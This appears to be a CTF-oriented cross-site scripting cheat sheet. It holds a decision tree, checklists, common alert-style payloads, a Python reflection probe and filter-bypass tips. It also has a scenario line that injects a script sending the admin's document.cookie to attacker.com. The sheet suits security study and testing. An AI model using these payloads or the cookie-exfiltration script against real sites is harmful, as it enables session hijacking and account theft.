# Cross-Site Scripting (XSS)

## Purpose
Execute arbitrary client-side Javascript code in the victim's browser context to hijack sessions or modify page contents.

## Decision Tree
```
Is input reflected in page response?
 ├── Yes -> Check context:
 │    ├── Inside HTML tags? -> Test <script> or image onerror
 │    ├── Inside attribute? -> Test event handlers (onload, onclick)
 │    └── Inside script block? -> Escape string format using '; alert(1); //
 └── No -> Check if stored in DB and loaded elsewhere? (Stored XSS)
```

## Recon Checklist
- [ ] Locate all reflection zones where input is echoed back to the screen.
- [ ] Catalog user profiles, comment fields, and search inputs.

## Detection Checklist
- [ ] Submit dummy alphanumeric string (e.g. `testxss123`) and verify its presence in response source.
- [ ] Check characters filters (e.g., `"< > ' "` allowed?).

## Recon Workflow
1. Browse target application and input standard values.
2. Locate where input is placed inside the HTML structure.
3. Test character limitations.

## Enumeration
- Identify WAF filters. Try tags without scripts like `<svg onload=1>`.
- Determine if `HttpOnly` cookie flags are set. If true, cookie theft via script is blocked.

## Useful Tools
- Burp Suite
- `XSStrike` (Advanced scanner)

## Quick Commands
```bash
# Parse pages for parameters
python3 scripts/url_extractor.py http://target.local
```

## Linux Commands
*(None applicable; this is client-side exploit)*

## Common Payloads
```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
```

## Exploitation Workflow
1. Find reflection endpoint context.
2. Construct injection payload that breaks current context syntax.
3. Call remote JS source or read session credentials.

## Example CTF Scenario
A guestbook application prints user names to the admin portal. Injecting `<script>fetch('http://attacker.com/?c='+document.cookie)</script>` sends the admin session cookie to the attacker listener.

## Python Automation Example
```python
import requests
# Check if input is reflected without sanitization
url = "http://target.com/search?q="
payload = "<script>alert(1)</script>"
r = requests.get(url + payload)
if payload in r.text:
    print("[+] Reflected XSS vulnerability detected!")
```

## Common Mistakes
- Not closing container tags before injecting XSS payload.
- Failing to bypass character filtering rules (e.g. using `atob` for base64 bypasses).

## CTF Tips
- If `alert()` is blocked, try `confirm()`, `prompt()`, or `print()`.
- Use the HTTP listener script (`scripts/http_listener.py`) to capture exfiltrated data.

## References
- OWASP: Cross-Site Scripting (XSS)
- PayloadsAllTheThings: XSS
